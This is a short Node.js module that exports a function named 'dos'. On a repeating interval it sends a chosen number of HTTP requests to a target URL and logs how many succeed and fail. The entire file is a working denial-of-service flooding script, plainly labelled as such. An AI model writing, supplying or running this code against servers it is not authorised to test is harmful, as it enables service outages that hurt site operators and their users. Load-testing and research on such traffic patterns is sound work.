const req = require('request');

const dos = (url, qty, ms) => {
    let err = 0, ok = 0;
    let counter = 1;

    setInterval(() => {

        for (let i = 0; i < qty; i++) {
            req(url, error => {
                if (error) {
                    err++;
                } else {
                    ok++;
                }
            });
        }
            console.log(`${counter}: ${url} ${ok} ${err}`);
            counter++;
            err = ok = 0;
    }, ms);
};

module.exports = dos;
              
